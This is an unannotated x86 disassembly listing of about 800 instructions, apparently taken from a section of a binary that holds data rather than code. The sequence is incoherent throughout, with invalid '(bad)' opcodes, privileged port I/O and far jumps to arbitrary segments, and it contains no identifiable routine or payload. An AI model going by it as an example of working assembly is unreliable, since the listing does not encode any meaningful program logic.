  422ff1:	xor    eax,0x86a514b8
  422ff6:	adc    eax,0x3d994f88
  422ffb:	pop    ss
  422ffc:	mov    edi,0x8ba51853
  423001:	jecxz  0x422fe8
  423003:	add    DWORD PTR [edx+ebp*4],edx
  423006:	repz sub eax,0xd1651777
  42300c:	ror    BYTE PTR [edi-0x25],0x23
  423010:	je     0x422fb6
  423012:	fadd   DWORD PTR [ecx+0x45f19db7]
  423018:	(bad)  
  423019:	pop    ecx
  42301a:	adc    ebx,edi
  42301c:	sub    bh,al
  42301e:	xor    bl,BYTE PTR ds:0xf3e66485
  423024:	cli    
  423025:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423026:	and    ebp,DWORD PTR [edx]
  423028:	cwde   
  423029:	and    al,0x46
  42302b:	mov    dh,0x1f
  42302d:	icebp  
  42302e:	stos   DWORD PTR es:[edi],eax
  42302f:	mov    esp,0xef6a5e50
  423034:	pop    es
  423035:	jb     0x422ff7
  423037:	stc    
  423038:	sar    BYTE PTR [esi+0x5132a196],1
  42303e:	jg     0x423085
  423040:	jb     0x42304e
  423042:	inc    edi
  423043:	mov    ah,0x3e
  423045:	jo     0x423081
  423047:	inc    ebp
  423048:	jmp    0x896d:0x43510658
  42304f:	cdq    
  423050:	xchg   esp,eax
  423051:	shl    DWORD PTR [ebx],cl
  423053:	adc    al,0xba
  423055:	mov    ds:0x34f73085,al
  42305a:	out    0xd8,al
	...
  4230a4:	add    BYTE PTR [eax],al
  4230a6:	aad    0x80
  4230a8:	pusha  
  4230a9:	cld    
  4230aa:	jne    0x4230a8
  4230ac:	(bad)  [ecx+0x32bc8e94]
  4230b2:	loope  0x423066
  4230b4:	push   es
  4230b5:	imul   eax,DWORD PTR [ebx+0x21],0x71e0001
  4230bc:	add    BYTE PTR [eax],al
  4230be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4230bf:	gs jb  0x42307f
  4230c2:	jns    0x423076
  4230c4:	adc    esp,ebp
  4230c6:	test   BYTE PTR [edx+esi*8],ah
  4230c9:	sbb    dl,0xad
  4230cc:	(bad)  
  4230cd:	sti    
  4230ce:	fidivr WORD PTR [edi-0x4f47fcd8]
  4230d4:	sti    
  4230d5:	pop    esi
  4230d6:	out    0x96,al
  4230d8:	jg     0x423117
  4230da:	pop    eax
  4230db:	data16 daa 
  4230dd:	loop   0x4230d0
  4230df:	xor    eax,0xe3c954bf
  4230e4:	pop    ecx
  4230e5:	mov    bh,0xae
  4230e7:	in     al,dx
  4230e8:	pop    esp
  4230e9:	sahf   
  4230ea:	pusha  
  4230eb:	loop   0x423095
  4230ed:	in     eax,dx
  4230ee:	aad    0xba
  4230f0:	and    DWORD PTR [eax-0x50],eax
  4230f3:	add    cl,BYTE PTR [esi+0x12aafba]
  4230f9:	out    0x42,al
  4230fb:	fstp   DWORD PTR [ebx]
  4230fd:	and    ebp,DWORD PTR [esi+0x5c6a23e]
  423103:	leave  
  423104:	(bad)  
  423105:	outs   dx,DWORD PTR ds:[esi]
  423106:	loope  0x4230e6
  423108:	mov    al,ds:0x16326362
  42310d:	(bad)
  423110:	xor    DWORD PTR [edi+0x5a0c35e7],esp
  423116:	jns    0x423184
  423118:	ds dec ebp
  42311a:	bound  edx,QWORD PTR [ebp+0x29]
  42311d:	fidivr WORD PTR [eax-0x45c1db90]
  423123:	xor    ah,0x47
  423126:	addr16 js 0x4230f7
  423129:	mov    ds:0x5d10a6e4,al
  42312e:	jo     0x4230f1
  423130:	or     esp,DWORD PTR [ebx+0xf086fae]
  423136:	jg     0x42317f
  423138:	sbb    BYTE PTR [edi-0xe2c2191],dl
  42313e:	pop    esi
  42313f:	mul    edx
  423141:	add    esi,ecx
  423143:	repnz push esp
  423145:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423146:	xchg   DWORD PTR [ebp-0x32d8a567],esp
  42314c:	aam    0xe6
  42314e:	mov    esp,0x1ca207d1
  423153:	out    dx,al
  423154:	repz popa 
  423156:	stos   DWORD PTR es:[edi],eax
  423157:	push   ebx
  423158:	leave  
  423159:	and    BYTE PTR [ebp-0x56e9f66f],al
  42315f:	pminub mm3,mm3
  423162:	call   0xceec933
  423167:	ret    0x1fbd
  42316a:	xchg   edi,eax
  42316b:	sub    al,0xe5
  42316d:	cmp    DWORD PTR [eax+0x5b40e54f],esp
  423173:	popa   
  423174:	xor    bl,BYTE PTR [ecx+0x72]
  423177:	xor    DWORD PTR [edx+ebx*8-0x757ac82d],ecx
  42317e:	div    BYTE PTR [ebp+0x46]
  423181:	adc    DWORD PTR [edx-0x11471133],0x1f
  423188:	jg     0x4231c0
  42318a:	(bad)  
  42318b:	xchg   edx,eax
  42318c:	mov    fs,esi
  42318e:	pop    edi
  42318f:	int    0xb5
  423191:	or     eax,0x8df3ecf6
  423196:	test   esp,eax
  423198:	mov    BYTE PTR [ebp-0x7b48a6f9],ch
  42319e:	stos   BYTE PTR es:[edi],al
  42319f:	test   ebp,0x6133a37
  4231a5:	cmp    eax,0x7ae34473
  4231aa:	js     0x4231a4
  4231ac:	inc    eax
  4231ad:	arpl   WORD PTR [esp+eiz*8-0x2906a7e7],si
  4231b4:	std    
  4231b5:	cmc    
  4231b6:	nop
  4231b7:	push   ecx
  4231b8:	gs mov cl,0xb6
  4231bb:	jo     0x423170
  4231bd:	mov    al,ds:0x5f39abeb
  4231c2:	jl     0x42315b
  4231c4:	push   ecx
  4231c5:	mov    edi,0xd71641a5
  4231ca:	int3   
  4231cb:	fdiv   st(2),st
  4231cd:	and    cl,dh
  4231cf:	adc    DWORD PTR [edx+0x3f],ecx
  4231d2:	leave  
  4231d3:	sbb    edx,ebp
  4231d5:	dec    edx
  4231d6:	add    DWORD PTR [edx],eax
  4231d8:	and    bl,BYTE PTR [esi+eiz*1]
  4231db:	loope  0x4231c3
  4231dd:	je     0x4231a7
  4231df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4231e0:	mov    BYTE PTR [eax],al
  4231e2:	cmp    eax,0x79c0709a
  4231e7:	(bad)  
  4231e8:	sbb    bh,BYTE PTR [edi+0x2168361a]
  4231ee:	(bad)  
  4231ef:	ds push 0x47
  4231f2:	rdpid  ebx
  4231f6:	sbb    eax,0x81df2c85
  4231fb:	and    eax,0xf47f5d2
  423200:	into   
  423201:	retf   0x34a0
  423204:	test   BYTE PTR [ecx-0x60],al
  423207:	push   ds
  423208:	jo     0x42325e
  42320a:	fisttp WORD PTR [esi+0xd28c986]
  423210:	iret   
  423211:	ss repnz dec eax
  423214:	push   ebp
  423215:	pop    eax
  423216:	in     al,dx
  423217:	pop    ss
  423218:	inc    edx
  423219:	(bad)  
  42321a:	cld    
  42321b:	xchg   edi,eax
  42321c:	enter  0x7a1,0x36
  423220:	js     0x423265
  423222:	retf   0xd8fa
  423225:	or     eax,0xd1cb414
  42322a:	fwait
  42322b:	data16 mov BYTE PTR [edi+edx*1],ch
  42322f:	mov    edi,0x352ce5b3
  423234:	mov    eax,ds:0x4ec42b89
  423239:	call   0x544ed26e
  42323e:	int    0x6d
  423240:	xchg   esi,eax
  423241:	(bad)  
  423242:	push   ds
  423243:	fbstp  TBYTE PTR [ecx]
  423245:	fadd   st(4),st
  423247:	hlt    
  423248:	inc    eax
  423249:	ret    0x7d7f
  42324c:	cmp    al,0xb3
  42324e:	and    DWORD PTR [esi+0x15a70c1f],esp
  423254:	mov    ah,0x7c
  423256:	out    0x58,al
  423258:	push   eax
  423259:	fsub   DWORD PTR [ecx-0x41659ce8]
  42325f:	in     al,0xd4
  423261:	sub    BYTE PTR [edi],bh
  423263:	xchg   edi,eax
  423264:	aam    0x8f
  423266:	cmp    bh,ah
  423268:	pop    ss
  423269:	in     eax,0x2c
  42326b:	bnd jae 0x423298
  42326e:	stos   DWORD PTR es:[edi],eax
  42326f:	or     al,0x82
  423271:	out    dx,al
  423272:	int    0xc5
  423274:	adc    ebx,esi
  423276:	ins    DWORD PTR es:[edi],dx
  423277:	mov    DWORD PTR [edi],ebx
  423279:	add    al,BYTE PTR ds:0xd3d3118
  42327f:	push   ebx
  423280:	xchg   edi,eax
  423281:	dec    edx
  423282:	pop    ebx
  423283:	cdq    
  423284:	xor    BYTE PTR [esi-0x9958902],ah
  42328a:	pop    edi
  42328b:	nop
  42328c:	sbb    eax,DWORD PTR [edi]
  42328e:	(bad)  
  42328f:	push   0xd396ffef
  423294:	data16 mov dh,0x5b
  423297:	test   al,0x9b
  423299:	inc    esp
  42329a:	clc    
  42329b:	test   eax,0x7d3d3934
  4232a0:	stos   DWORD PTR es:[edi],eax
  4232a1:	inc    edi
  4232a2:	sti    
  4232a3:	cdq    
  4232a4:	jnp    0x4232e9
  4232a6:	lock sub BYTE PTR [esi+esi*4-0x32b821ac],dl
  4232ae:	cmp    al,0x6
  4232b0:	(bad)  
  4232b1:	loopne 0x423253
  4232b3:	or     ecx,DWORD PTR [ebp+eiz*4-0x1d660001]
  4232ba:	jb     0x423327
  4232bc:	jb     0x423290
  4232be:	repz push eax
  4232c0:	aad    0x88
  4232c2:	add    ebx,DWORD PTR [ebx+0x7556d47b]
  4232c8:	jge    0x4232e6
  4232ca:	adc    eax,0xe85d5e30
  4232cf:	mov    bl,0x77
  4232d1:	retf   0xd1a3
  4232d4:	loopne 0x4232db
  4232d6:	inc    edx
  4232d7:	inc    esi
  4232d8:	je     0x42331a
  4232da:	mov    edx,0x9cedee0f
  4232df:	pusha  
  4232e0:	add    al,0x4f
  4232e2:	ja     0x423304
  4232e4:	dec    edi
  4232e5:	cld    
  4232e6:	iret   
  4232e7:	stos   BYTE PTR es:[edi],al
  4232e8:	jle    0x42335a
  4232ea:	dec    esi
  4232eb:	and    bl,0x66
  4232ee:	mov    WORD PTR [edi+0x26],gs
  4232f1:	sbb    ah,BYTE PTR [esi]
  4232f3:	and    esp,0x1d
  4232f6:	fst    DWORD PTR [edx-0x6f]
  4232f9:	retf   0xb063
  4232fc:	jmp    0x4232b7
  4232fe:	xchg   esi,eax
  4232ff:	push   edi
  423300:	jmp    0xc278:0x7bfd77b6
  423307:	pop    edi
  423308:	cs mov bh,0xd2
  42330b:	imul   ebp,ecx,0xffffffec
  42330e:	sub    dl,BYTE PTR [edx]
  423310:	ins    BYTE PTR es:[edi],dx
  423311:	fldenv [ecx+edx*8-0x2b8d577a]
  423318:	xlat   BYTE PTR ds:[ebx]
  423319:	mov    ah,0x72
  42331b:	pop    ds
  42331c:	mov    bh,0xa2
  42331e:	aas    
  42331f:	dec    esi
  423320:	outs   dx,BYTE PTR ds:[esi]
  423321:	jg     0x42334b
  423323:	aaa    
  423324:	or     esi,DWORD PTR ds:0xd6e2ad36
  42332a:	in     eax,0x6
  42332c:	dec    eax
  42332d:	xor    BYTE PTR [ebx-0x14773c3c],0x91
  423334:	push   esi
  423335:	jl     0x423348
  423337:	xchg   ecx,eax
  423338:	push   ebp
  423339:	sub    DWORD PTR [esi],0x27932e29
  42333f:	add    dh,al
  423341:	inc    esp
  423342:	push   ebp
  423343:	push   esp
  423344:	mov    ecx,0x12efd706
  423349:	fadd   DWORD PTR [ebp+0x5d]
  42334c:	xor    al,0x19
  42334e:	iret   
  42334f:	in     al,dx
  423350:	iret   
  423351:	jnp    0x4232f8
  423353:	push   eax
  423354:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423355:	fs stc 
  423357:	mov    ecx,0xd95b96bd
  42335c:	jle    0x4233a9
  42335e:	cmp    cl,dh
  423360:	mov    ds:0xbce72caa,al
  423365:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423366:	fsubr  st,st(2)
  423368:	add    ebx,DWORD PTR [edi-0x3f]
  42336b:	and    eax,0xcea93e38
  423370:	and    BYTE PTR [esi+0x962f2ad],0xb7
  423377:	test   dh,ah
  423379:	ret    0x6eef
  42337c:	push   esi
  42337d:	sbb    al,0x94
  42337f:	pop    esi
  423380:	sahf   
  423381:	in     al,dx
  423382:	and    ah,BYTE PTR [edi+0x6e]
  423385:	int    0x48
  423387:	xor    al,0xcf
  423389:	cmp    eax,0x5ace2018
  42338e:	mov    esi,0x7cd01f4b
  423393:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423394:	aam    0x76
  423396:	ins    BYTE PTR es:[edi],dx
  423397:	xchg   ebp,eax
  423398:	fiadd  WORD PTR [esi-0x494016c5]
  42339e:	dec    esp
  42339f:	lods   al,BYTE PTR ds:[esi]
  4233a0:	fcomp  st(0)
  4233a2:	mov    ch,bh
  4233a4:	and    eax,0xd555f197
  4233a9:	adc    edi,ebp
  4233ab:	dec    eax
  4233ac:	inc    esp
  4233ad:	rcl    BYTE PTR [edx+eiz*2],0xad
  4233b1:	push   ecx
  4233b2:	inc    esi
  4233b3:	cs dec ebp
  4233b5:	cwde   
  4233b6:	xchg   edi,eax
  4233b7:	cli    
  4233b8:	jno    0x423343
  4233ba:	push   ss
  4233bb:	and    ebp,esi
  4233bd:	and    bl,BYTE PTR [ecx]
  4233bf:	add    DWORD PTR ds:0xf4dc6975,ecx
  4233c5:	xchg   BYTE PTR [esi+0x7362c67c],dh
  4233cb:	dec    edi
  4233cc:	je     0x423449
  4233ce:	imul   edi,DWORD PTR [esp+ecx*1],0xffffffe7
  4233d2:	cmp    eax,0x4170c333
  4233d7:	pop    edi
  4233d8:	cli    
  4233d9:	dec    DWORD PTR [edi+0x1f]
  4233dc:	jae    0x423451
  4233de:	or     edx,0xffffffdc
  4233e1:	lahf   
  4233e2:	ins    DWORD PTR es:[edi],dx
  4233e3:	push   ds
  4233e4:	mov    BYTE PTR [edi-0x1168421e],ch
  4233ea:	rcl    esp,1
  4233ec:	pop    ecx
  4233ed:	test   dl,ah
  4233ef:	or     DWORD PTR [edx+0x201284ef],edx
  4233f5:	inc    esp
  4233f6:	in     eax,0xb8
  4233f8:	std    
  4233f9:	arpl   dx,sp
  4233fb:	in     eax,0x56
  4233fd:	sub    ebp,edx
  4233ff:	push   ebx
  423400:	popf   
  423401:	popf   
  423402:	imul   esp,DWORD PTR [ebp+0x72],0x6a70f91b
  423409:	cmp    DWORD PTR [edi-0x68],esp
  42340c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42340d:	dec    ebp
  42340e:	push   cs
  42340f:	jl     0x4233bd
  423411:	sub    eax,0x1bb31a8
  423416:	jle    0x423412
  423418:	add    DWORD PTR [eax+ecx*1-0x54],eax
  42341c:	imul   esi,DWORD PTR [esi+0x68],0xa3316bea
  423423:	mov    eax,0x315c409b
  423428:	outs   dx,BYTE PTR ds:[esi]
  423429:	lods   eax,DWORD PTR ds:[esi]
  42342a:	fnsave [edx+ecx*8-0x7b738cf1]
  423431:	mov    cl,0x8a
  423433:	mov    ah,0x26
  423435:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423436:	push   esi
  423437:	mov    al,0xb7
  423439:	je     0x4233e3
  42343b:	pop    edi
  42343c:	jae    0x42343f
  42343e:	jecxz  0x423429
  423440:	sbb    BYTE PTR [ebp-0x26add3e7],bl
  423446:	jg     0x4233d3
  423448:	pop    ebx
  423449:	sbb    cl,BYTE PTR [ecx+0x32]
  42344c:	and    BYTE PTR [ebx],0xe9
  42344f:	test   DWORD PTR [eax-0x792f5d02],edi
  423455:	pop    ebx
  423456:	xchg   esi,eax
  423457:	stos   BYTE PTR es:[edi],al
  423458:	cmp    BYTE PTR [eax],bh
  42345a:	ss add al,0x75
  42345d:	and    DWORD PTR [esi],ecx
  42345f:	imul   ebp,DWORD PTR [ebx],0x78c56863
  423465:	xor    eax,0xc845ae70
  42346a:	adc    BYTE PTR [ebx+0x79bc6],ah
  423470:	pop    ebx
  423471:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  423473:	inc    esp
  423474:	sbb    ecx,eax
  423476:	push   0xffffffb4
  423478:	mov    DWORD PTR [edx-0x5470e0ee],esi
  42347e:	sub    edi,ebx
  423480:	bound  esp,QWORD PTR [eax]
  423482:	adc    eax,edi
  423484:	sub    ebx,DWORD PTR [ebx-0x4a4a72ef]
  42348a:	ret    0xadc9
  42348d:	sub    al,0x8b
  42348f:	xor    eax,0x5c0113f3
  423494:	imul   ebp,DWORD PTR [esi],0xbf7cf275
  42349a:	xchg   edi,eax
  42349b:	xchg   esp,eax
  42349c:	pusha  
  42349d:	in     eax,dx
  42349e:	and    eax,0x78a5f4a0
  4234a3:	rcl    BYTE PTR [ebx+esi*2+0x38],0x22
  4234a8:	xor    BYTE PTR [ebx-0x1c],dh
  4234ab:	push   eax
  4234ac:	popa   
  4234ad:	les    edx,FWORD PTR [edx-0x9b5ca2f]
  4234b3:	stos   BYTE PTR es:[edi],al
  4234b4:	bnd ret 0xfc42
  4234b8:	cmp    DWORD PTR [edi+0x6],ecx
  4234bb:	push   0xe0de4006
  4234c0:	push   ss
  4234c1:	nop
  4234c2:	cmp    al,0x2a
  4234c4:	enter  0xbcb7,0xdf
  4234c8:	add    ebp,ebx
  4234ca:	cmp    al,dh
  4234cc:	mov    ah,al
  4234ce:	mul    dh
  4234d0:	sbb    DWORD PTR [eax-0x6abb742e],0x7c
  4234d7:	push   0x5a
  4234d9:	xor    eax,0x2ce8eb10
  4234de:	aam    0x8f
  4234e0:	and    al,0x61
  4234e2:	sub    al,0x4d
  4234e4:	or     ebp,DWORD PTR [edx]
  4234e6:	cmp    al,dl
  4234e8:	sub    dh,BYTE PTR [ebx-0x73b447c5]
  4234ee:	dec    ebx
  4234ef:	xor    DWORD PTR [edi+ecx*8],ebp
  4234f2:	sbb    cl,BYTE PTR [esi-0x1d563ec9]
  4234f8:	xchg   ecx,eax
  4234f9:	add    dl,cl
  4234fb:	push   ebp
  4234fc:	cmp    eax,0x9bf54e16
  423502:	repz fcomp QWORD PTR [edx]
  423505:	dec    eax
  423506:	arpl   WORD PTR [ebx+0x5a9d9d05],si
  42350c:	(bad)  
  42350e:	jno    0x423505
  423510:	xor    BYTE PTR [edx+0x3a0e8e21],cl
  423516:	data16 std 
  423518:	xor    al,0xcc
  42351a:	push   edx
  42351b:	imul   ebx,DWORD PTR [edi+0x1deba193],0x83b45d9a
  423525:	adc    ch,BYTE PTR [edx+0x38]
  423528:	stos   DWORD PTR es:[edi],eax
  423529:	push   es
  42352a:	jno    0x4234c6
  42352c:	lea    ebp,[ecx+0x234e6f67]
  423532:	stc    
  423533:	lods   eax,DWORD PTR ds:[esi]
  423534:	mov    bl,BYTE PTR [ebp+0x8853622]
  42353a:	push   0xba1c1c0c
  42353f:	mov    al,ds:0xd551049b
  423544:	mov    edi,DWORD PTR [ebp+ebx*8-0x3e]
  423548:	out    dx,eax
  423549:	xchg   DWORD PTR [eax],edi
  42354b:	cdq    
  42354c:	adc    eax,0xc2ddcd61
  423551:	inc    edx
  423552:	jmp    0x4235a3
  423554:	leave  
  423555:	dec    ebp
  423556:	cwde   
  423557:	and    al,0x13
  423559:	(bad)  
  42355a:	lea    ecx,[ebx]
  42355c:	out    dx,al
  42355d:	retf   
  42355e:	xchg   cl,dl
  423560:	hlt    
  423561:	jae    0x423568
  423563:	inc    ebp
  423564:	es popa 
  423566:	addr16 cmp eax,0x4ace41e1
  42356c:	push   ebp
  42356d:	dec    esp
  42356e:	ficomp WORD PTR [edx+0x63]
  423571:	idiv   dh
  423573:	push   edi
  423574:	xor    esi,edi
  423576:	inc    esi
  423577:	out    dx,al
  423578:	js     0x4235b4
  42357a:	inc    esi
  42357b:	(bad)  
  42357c:	pusha  
  42357d:	in     eax,dx
  42357e:	xor    DWORD PTR [ebx-0x5a080d6a],esp
  423584:	xchg   ecx,eax
  423585:	imul   ebx,DWORD PTR [ebx+0x48],0x7dccdc7d
  42358c:	mov    dh,0x95
  42358e:	or     eax,0xd68e5788
  423593:	pop    esp
  423594:	inc    edx
  423595:	stc    
  423596:	add    DWORD PTR [ecx+0x7afa808e],ebx
  42359c:	or     bl,dh
  42359e:	dec    ebp
  42359f:	sbb    cl,BYTE PTR [edx+0x5d]
  4235a2:	outs   dx,DWORD PTR ds:[esi]
  4235a3:	test   BYTE PTR [edx+0x6a916d78],al
  4235a9:	repz jge 0x4235ba
  4235ac:	mov    eax,0xf7e75ef9
  4235b1:	dec    ecx
  4235b2:	(bad)  
  4235b3:	adc    ch,BYTE PTR [eax]
  4235b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4235b6:	bound  edx,QWORD PTR [ebx+edx*2+0x3fcc1327]
  4235bd:	mov    cl,0xe
  4235bf:	sbb    al,0xf3
  4235c1:	int3   
  4235c2:	dec    ebp
  4235c3:	out    dx,eax
  4235c4:	jmp    0x4235be
  4235c6:	mov    esp,0x6c7925ae
  4235cb:	jb     0x4235bc
  4235cd:	shr    BYTE PTR [edx],cl
  4235cf:	dec    eax
  4235d0:	test   edi,0xc8659dba
  4235d6:	add    DWORD PTR [ecx],edi
  4235d8:	fadd   st,st(0)
  4235da:	mov    ch,0x73
  4235dc:	sbb    al,0xd
  4235de:	xor    DWORD PTR [eax+0x4dd3302c],esi
  4235e4:	pop    ebp
  4235e5:	mov    esp,0x6899066c
  4235ea:	das    
  4235eb:	rcl    bh,1
  4235ed:	jbe    0x4235ba
  4235ef:	(bad)
  4235f2:	std    
  4235f3:	mov    bh,0x0
  4235f5:	xor    eax,0x485966b2
  4235fa:	inc    edx
  4235fb:	and    eax,0xd2906ab5
  423600:	fs in  eax,0xbb
  423603:	push   edi
  423604:	pop    esp
  423605:	push   ds
  423606:	xlat   BYTE PTR ds:[ebx]
  423607:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423608:	pslld  mm0,QWORD PTR [edx]
  42360b:	mov    WORD PTR [edi],?
  42360d:	inc    BYTE PTR [ecx+0x61b596c4]
  423613:	cmp    BYTE PTR ds:[edi],dh
  423616:	dec    BYTE PTR [esi]
  423618:	leave  
  423619:	adc    eax,0x95ac6766
  42361e:	or     ebx,edx
  423620:	sub    ah,ah
  423622:	push   0xa167fa0
  423627:	stc    
  423628:	dec    eax
  423629:	xchg   ecx,eax
  42362a:	fild   DWORD PTR [ebp-0x5b]
  42362d:	(bad)  
  42362e:	jo     0x42366a
  423630:	retf   0x8f56
  423633:	xchg   ebp,eax
  423634:	icebp  
  423635:	test   BYTE PTR [eax],dh
  423637:	jno    0x42368b
  423639:	gs mov dh,0x15
  42363c:	dec    ecx
  42363d:	jmp    0x5ce7da44
  423642:	jnp    0x4236c3
  423644:	inc    eax
  423645:	cld    
  423646:	fcmovnu st,st(3)
  423648:	xchg   ebp,eax
  423649:	xchg   cl,al
  42364b:	es cs add dl,0xe4
  423650:	sbb    al,0x68
  423652:	in     al,dx
  423653:	nop
  423654:	mov    esp,0xf859daf4
  423659:	xor    eax,eax
  42365b:	leave  
  42365c:	shl    DWORD PTR [edi-0x65c8dbd],1
  423662:	xchg   edx,eax
  423663:	pop    ss
  423664:	lds    esi,FWORD PTR [edi-0x52]
  423667:	sbb    DWORD PTR [ebx-0x47],0xb98f4789
  42366e:	cmp    DWORD PTR [esi-0x5d],0xffffff8f
  423672:	dec    edi
  423673:	mov    cs,eax
  423675:	aas    
  423676:	ret    0xef8f
  423679:	call   0x1f08:0x522f019a
  423680:	out    0x8,al
  423682:	xor    DWORD PTR [ecx-0x4c],0x57d66d71
  423689:	dec    ecx
  42368a:	pop    ecx
  42368b:	cmp    DWORD PTR [ecx+0x340d929b],eax
  423691:	pop    edx
  423692:	xchg   edx,eax
  423693:	bound  ecx,QWORD PTR [edi-0x5e]
  423696:	loope  0x4236be
  423698:	loop   0x42367c
  42369a:	push   0xffffff98
  42369c:	es icebp 
  42369e:	xchg   esi,eax
  42369f:	adc    DWORD PTR [ebx+eax*2-0x34],0x70d28e86
  4236a7:	imul   edi,DWORD PTR [ebp-0x4b9c56d],0x1b
  4236ae:	in     eax,0x8e
  4236b0:	outs   dx,BYTE PTR ds:[esi]
  4236b1:	mov    bh,0x25
  4236b3:	sbb    esi,DWORD PTR [ecx+0x4b]
  4236b6:	xchg   ecx,eax
  4236b7:	imul   edi,DWORD PTR [edi+0x55],0x4f27c747
  4236be:	enter  0x42fa,0x7f
  4236c2:	call   0xf5c9abd1
  4236c7:	push   eax
  4236c8:	sbb    DWORD PTR [esp+edx*4],edx
  4236cb:	jmp    0x4236c4
  4236cd:	add    al,BYTE PTR [edx]
  4236cf:	shr    DWORD PTR [ebp+0x755cdce],1
  4236d5:	mov    ds:0x3b2e50dc,eax
  4236da:	dec    edi
  4236db:	sbb    al,0x5d
  4236dd:	push   ebx
  4236de:	stc    
  4236df:	cli    
  4236e0:	fcmove st,st(4)
  4236e2:	jnp    0x423722
  4236e4:	pop    ebp
  4236e5:	and    ch,BYTE PTR [eax]
  4236e7:	mov    eax,ds:0x3f4e7a5e
  4236ec:	pop    esp
  4236ed:	or     al,0xa9
  4236ef:	adc    bh,al
  4236f1:	pop    edi
  4236f2:	fist   DWORD PTR [ebx+edi*8+0x767200a8]
  4236f9:	push   esi
  4236fa:	adc    ecx,ebp
  4236fc:	mov    WORD PTR [ecx+0x421f8042],es
  423702:	cmp    BYTE PTR [ecx-0x7a],ah
  423705:	push   0x7d
  423707:	fisubr DWORD PTR ds:0x54a2882a
  42370d:	or     al,0xf
  42370f:	mov    BYTE PTR [eax+edx*2],bl
  423712:	sar    DWORD PTR [ebx-0x10ca0608],cl
  423718:	and    eax,0x89f8d81a
  42371d:	sbb    eax,DWORD PTR [edx-0x38]
  423720:	call   0x3d7e:0xdf25ee52
  423727:	test   al,0x61
  423729:	pop    ds
  42372a:	call   ebp
  42372c:	outs   dx,DWORD PTR ds:[esi]
  42372d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42372e:	cmc    
  42372f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423730:	dec    eax
  423731:	and    BYTE PTR [esi-0x3b54659f],0x80
  423738:	les    ecx,FWORD PTR [edi+0x1a38a173]
  42373e:	sub    ah,BYTE PTR [esi]
  423740:	cld    
  423741:	fwait
  423742:	cmp    al,0x5
  423744:	or     ebp,DWORD PTR [ebp+ecx*8+0x2f]
  423748:	and    al,0xf4
  42374a:	clc    
  42374b:	sub    eax,DWORD PTR [edi]
  42374d:	jbe    0x42377b
  42374f:	mov    DWORD PTR [edx],esp
  423751:	pushf  
  423752:	mov    bh,0xe9
  423754:	mov    eax,0x84ed4fa4
  423759:	or     BYTE PTR [ebx],cl
  42375b:	adc    eax,ecx
  42375d:	in     al,0xdd
  42375f:	xchg   ecx,eax
  423760:	jmp    0x2050b072
  423765:	xchg   ebx,eax
  423766:	inc    edx
  423767:	sub    dl,dl
  423769:	pop    ecx
  42376a:	and    DWORD PTR [edx+0x690d8b0b],ebp
  423770:	adc    esp,ebx
  423772:	pop    esi
  423773:	popa   
  423774:	mov    dh,0x59
  423776:	outs   dx,DWORD PTR ds:[esi]
  423777:	mov    BYTE PTR [ebx+eiz*2],cl
  42377a:	arpl   WORD PTR [edi+0x5a69844a],sp
  423780:	aam    0x4a
  423782:	scas   al,BYTE PTR es:[edi]
  423783:	or     al,0xfd
  423785:	jnp    0x4237ce
  423787:	or     ebx,DWORD PTR ds:0x5fd2c565
  42378d:	in     eax,0xdb
  42378f:	xor    ecx,esp
  423791:	stos   DWORD PTR es:[edi],eax
  423792:	jmp    0x44e3:0x9e3db07f
  423799:	scas   al,BYTE PTR es:[edi]
  42379a:	cmc    
  42379b:	imul   esi,ebx,0x1f3498d0
  4237a1:	xchg   edx,edx
  4237a3:	or     DWORD PTR [esi],esp
  4237a5:	cli    
  4237a6:	or     BYTE PTR [esi-0x23],dl
  4237a9:	out    dx,al
  4237aa:	add    bh,ah
  4237ac:	mov    fs,WORD PTR [esi-0x5]
  4237af:	fisub  WORD PTR [edi+0x72415b1a]
  4237b5:	mov    eax,ds:0xdd2fc4e9
  4237ba:	cdq    
  4237bb:	rcl    al,cl
  4237bd:	xchg   esp,edx
  4237bf:	jl     0x4237e1
  4237c1:	pop    esi
  4237c2:	mov    dh,0xb8
  4237c4:	inc    edi
  4237c5:	mov    dh,0x81
  4237c7:	sub    bh,BYTE PTR [ebp-0x5c]
  4237ca:	mov    DWORD PTR [ecx],esp
  4237cc:	lock xor cl,dh
  4237cf:	jecxz  0x423818
  4237d1:	repz out 0x9a,al
  4237d4:	pop    ebp
  4237d5:	push   edi
  4237d6:	add    ecx,edi
  4237d8:	and    eax,0x6dbde1
	...
  423825:	add    BYTE PTR [edi+ecx*4+0x7ff767f6],bh
  42382c:	mov    ebp,0x792d96df
  423831:	mov    edx,0xb10f6232
  423836:	popa   
  423837:	sub    BYTE PTR [ecx],al
  423839:	add    BYTE PTR [esi],bl
  42383b:	pop    es
  42383c:	add    BYTE PTR [eax],al
  42383e:	popf   
  42383f:	es add al,0x65
  423842:	xor    edi,DWORD PTR [esi-0x29abf3b0]
  423848:	mov    bh,0x45
  42384a:	jecxz  0x423842
  42384c:	and    ecx,ebx
  42384e:	cld    
  42384f:	dec    esi
  423850:	push   0x2c
  423852:	(bad)  
  423854:	icebp  
  423855:	popa   
  423856:	pop    ebx
  423857:	mov    eax,0x23d464ae
  42385c:	adc    al,0x45
  42385e:	dec    ebx
  42385f:	adc    ebp,edx
  423861:	xchg   ebp,eax
  423862:	xchg   ecx,eax
  423863:	test   eax,0x1c9692bc
  423868:	test   bl,dh
  42386a:	mov    ebx,0x2d4971e5
  42386f:	leave  
  423870:	inc    ebx
  423871:	pop    ss
  423872:	iret   
  423873:	pusha  
  423874:	add    bh,ah
  423876:	aad    0x4c
  423878:	xor    DWORD PTR es:[edx],edi
  42387b:	sbb    BYTE PTR ds:0x950a1688,bl
  423881:	nop
  423882:	add    DWORD PTR [edi+0xa],edi
  423885:	imul   ecx,esi,0xffffff87
  423888:	leave  
